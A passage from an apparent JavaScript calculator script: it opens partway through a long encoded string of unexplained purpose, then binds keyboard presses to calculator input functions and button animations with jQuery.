u00b0\u00b0177\u00b0lp}733}\u00b0169\u00b0}683}\u00b0125\u00b0}828}1J}780}\u00b0213\u00b0\u00b0217\u00b0}743}\u00b0179\u00b0}725}\u00b0210\u00b0\u00b0155\u00b0\u00b0202\u00b0}753}\u00b0255\u00b0}705}\u00b0138\u00b0\u00b0142\u00b0\u00b0141\u00b0}811}%}667}\u00b0144\u00b0\u00b0169\u00b0dhg}832}\u00b09\u00b05}744}\u00b0246\u00b0\u00b0177\u00b0}703}\u00b0140\u00b0}789}\u00b0225\u00b0\u00b016\u00b0\u00b010\u00b0#\u00b0222\u00b0}756}\u00b0193\u00b0\u00b0193\u00b0\u00b0240\u00b0}716}\u00b0193\u00b0}781}\u00b027\u00b0}703}\u00b0136\u00b0\u00b0140\u00b0}689}\u00b0125\u00b0}786}\u00b012\u00b0}689}\u00b0166\u00b0}685}\u00b0187\u00b0vzzy}710}\u00b0187\u00b0}805}3}722}\u00b0155\u00b0}693}\u00b0130\u00b0}690}\u00b0126\u00b0}851}NHa}819}\u00b0252\u00b0\u00b00\u00b0}742}\u00b0179\u00b0\u00b0229\u00b0}856}Mf!}859}((&Pi$}840}\u00b021\u00b0\u00b020\u00b0F}789}\u00b010\u00b0}821}C}833}\u00b010\u00b0}764}\u00b0201\u00b0}776}\u00b0213\u00b0}677}n\u00b0154\u00b0\u00b0179\u00b0nr}758}\u00b0195\u00b0}672}\u00b0155\u00b0}852})\u00b028\u00b0N+}828}\u00b0252\u00b0\u00b0245\u00b0}834}\u00b024\u00b0\u00b024\u00b0}806}\u00b0223\u00b0#.}701}\u00b0185\u00b0\u00b0203\u00b0}698}\u00b0192\u00b0}812}*}731}\u00b0226\u00b0\u00b0232\u00b0\u00b0162\u00b0\u00b0219\u00b0\u00b0217\u00b0\u00b0232\u00b0}687}\u00b0141\u00b0\u00b0180\u00b0}707}\u00b0193\u00b0\u00b0201\u00b0}832}>}762}\u00b01\u00b0\u00b07\u00b0\u00b0213\u00b0}696}\u00b0202\u00b0}712}\u00b0170\u00b0}844}I}848}\u00b017\u00b0}687}j}748}\u00b0232\u00b0\u00b0230\u00b0}761}\u00b0254\u00b0\u00b0245\u00b0\u00b0254\u00b0\u00b0251\u00b0}677}\u00b0172\u00b0\u00b0169\u00b0`}803}\u00b0229\u00b0}730}\u00b0161\u00b0\u00b0220\u00b0}740}\u00b0235\u00b0}712}\u00b0207\u00b0}822}4A\u00b023\u00b0}667}\u00b0136\u00b0}784}\u00b0246\u00b0\u00b0245\u00b0\u00b0201\u00b0}735}\u00b0163\u00b0}717}\u00b0134\u00b0\u00b0136\u00b0\u00b0136\u00b0\u00b0143\u00b0}729}\u00b0146\u00b0\u00b0237\u00b0}779}\u00b0177\u00b0}667}>}853}\u00b014\u00b0}743}\u00b0160\u00b0\u00b0160\u00b0\u00b0160\u00b0}739}\u00b0238\u00b0}764}\u00b0250\u00b0\u00b09\u00b0\u00b010\u00b0}822}A=}716}\u00b0134\u00b0}792}\u00b0225\u00b0}848}\u00b0246\u00b0\u00b0243\u00b0\u00b09\u00b0}731}\u00b0148\u00b0\u00b0241\u00b0\u00b0129\u00b0}856}\u00b0251\u00b0}825}O" }

function xe(a) { return (a + "").charCodeAt(0) }
$(function() {
    $('a.btn,a.btn1,a.btn2,a.btn3,a.btn4').click(function(e) { e.preventDefault(); });
    $(document).keypress(function(a) {
        switch (a.which) {
            case 49:
                ins("1");
                $("#btn_1").css("position", "relative");
                $("#btn_1").css("top", "1px");
                setTimeout(function() { $("#btn_1").css("top", "0px") }, 150);
                break;
            case 50:
                ins("2");
                $("#btn_2").css("position", "relative");
                $("#btn_2").css("top", "1px");
                setTimeout(function() { $("#btn_2").css("top", "0px") }, 150);
                break;
            case 51:
                ins("3");
                $("#btn_3").css("position", "relative");
                $("#btn_3").css("top", "1px");
                setTimeout(function() { $("#btn_3").css("top", "0px") }, 150);
                break;
            case 52:
                ins("4");
                $("#btn_4").css("position", "relative");
                $("#btn_4").css("top", "1px");
                setTimeout(function() { $("#btn_4").css("top", "0px") }, 150);
                break;
            case 53:
                ins("5");
                $("#btn_5").css("position", "relative");
                $("#btn_5").css("top", "1px");
                setTimeout(function() { $("#btn_5").css("top", "0px") }, 150);
                break;
            case 54:
                ins("6");
                $("#btn_6").css("position", "relative");
                $("#btn_6").css("top", "1px");
                setTimeout(function() { $("#btn_6").css("top", "0px") }, 150);
                break;
            case 55:
                ins("7");
                $("#btn_7").css("position", "relative");
                $("#btn_7").css("top",
                    "1px");
                setTimeout(function() { $("#btn_7").css("top", "0px") }, 150);
                break;
            case 56:
                ins("8");
                $("#btn_8").css("position", "relative");
                $("#btn_8").css("top", "1px");
                setTimeout(function() { $("#btn_8").css("top", "0px") }, 150);
                break;
            case 57:
                ins("9");
                $("#btn_9").css("position", "relative");
                $("#btn_9").css("top", "1px");
                setTimeout(function() { $("#btn_9").css("top", "0px") }, 150);
                break;
            case 48:
                ins("0"), $("#btn_0").css("position", "relative"), $("#btn_0").css("top", "1px"), setTimeout(function() { $("#btn_0").css("top", "0px") },
                    150)
        }
    });
    $(document).keydown(function(a) {
        switch (a.keyCode) {
            case 110:
                ins(".");
                $("#btn_point").css("position", "relative");
                $("#btn_point").css("top", "1px");
                break;
            case 106:
                multiplicativeOperator("*");
                $("#btn_mult").css("position", "relative");
                $("#btn_mult").css("top", "1px");
                break;
            case 107:
                additiveOperator("+");
                $("#btn_plus").css("position", "relative");
                $("#btn_plus").css("top", "1px");
                break;
            case 109:
                additiveOperator("-");
                $("#btn_minus").css("position", "relative");
                $("#btn_minus").css("top", "1px");
                break;
            case 111:
                multiplicativeOperator("/");
                $("#btn_div").css("position", "relative");
                $("#btn_div").css("top", "1px");
                break;
            case 13:
                operation_equal();
                $("#btn_enter").css("position", "relative");
                $("#btn_enter").css("top", "-83px");
                break;
            case 8:
                backspace();
                $("#btn_bs").css("position", "relative");
                $("#btn_bs").css("top", "1px");
                break;
            case 46:
                calc_CE();
                $("#btn_ce").css("position", "relative");
                $("#btn_ce").css("top", "1px");
                break;
            case 27:
                calc_clear(), $("#btn_esc").css("position", "relative"), $("#btn_esc").css("top", "1px")
        }
    });
    $(document).keyup(function(a) {
        switch (a.keyCode) {
            case 110:
                $("#btn_point").css("top",
                    "0px");
                break;
            case 106:
                $("#btn_mult").css("top", "0px");
                break;
            case 107:
                $("#btn_plus").css("top", "0px");
                break;
            case 109:
                $("#btn_minus").css("top", "0px");
                break;
            case 111:
                $("#btn_div").css("top", "0px");
                break;
            case 13:
                $("#btn_enter").css("top", "-84px");
                break;
            case 8:
                $("#btn_bs").css("top", "0px");
                break;
            case 46:
                $("#btn_ce").css("top", "0px");
                break;
            case 27:
                calc_clear(), $("#btn_esc").css("top", "0px")
        }
    })
});